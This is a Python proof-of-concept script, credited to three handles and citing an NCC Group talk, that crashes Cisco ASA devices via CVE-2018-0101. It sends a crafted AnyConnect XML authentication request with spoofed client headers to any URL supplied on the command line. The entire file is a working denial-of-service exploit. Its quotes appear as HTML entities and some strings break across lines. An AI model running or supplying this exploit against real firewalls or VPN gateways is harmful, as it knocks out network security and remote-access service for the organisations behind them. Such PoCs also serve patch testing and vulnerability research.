# Cisco ASA CVE-2018-0101 Crash PoC
#
# We basically just read:
# https://www.nccgroup.trust/globalassets/newsroom/uk/events/2018/02/reconbrx2018-robin-hood-vs-cisco-asa.pdf
#
# @zerosum0x0, @jennamagius, @aleph___naught
#
 
import requests, sys
 
headers = {}
headers[&#039;User-Agent&#039;] = &#039;Open AnyConnect VPN Agent
v7.08-265-gae481214-dirty&#039;
headers[&#039;Content-Type&#039;] = &#039;application/x-www-form-urlencoded&#039;
headers[&#039;X-Aggregate-Auth&#039;] = &#039;1&#039;
headers[&#039;X-Transcend-Version&#039;] = &#039;1&#039;
headers[&#039;Accept-Encoding&#039;] = &#039;identity&#039;
headers[&#039;Accept&#039;] = &#039;*/*&#039;
headers[&#039;X-AnyConnect-Platform&#039;] = &#039;linux-64&#039;
headers[&#039;X-Support-HTTP-Auth&#039;] = &#039;false&#039;
headers[&#039;X-Pad&#039;] = &#039;0000000000000000000000000000000000000000&#039;
 
xml = """<?xml version="1.0" encoding="UTF-8"?>
<config-auth client="a" type="a" aggregate-auth-version="a">
    <host-scan-reply>A</host-scan-reply>
</config-auth>
"""
 
r = requests.post(sys.argv[1], data = xml, headers = headers, verify=False,
allow_redirects=False)
 
print(r.status_code)
print(r.headers)
print(r.text)

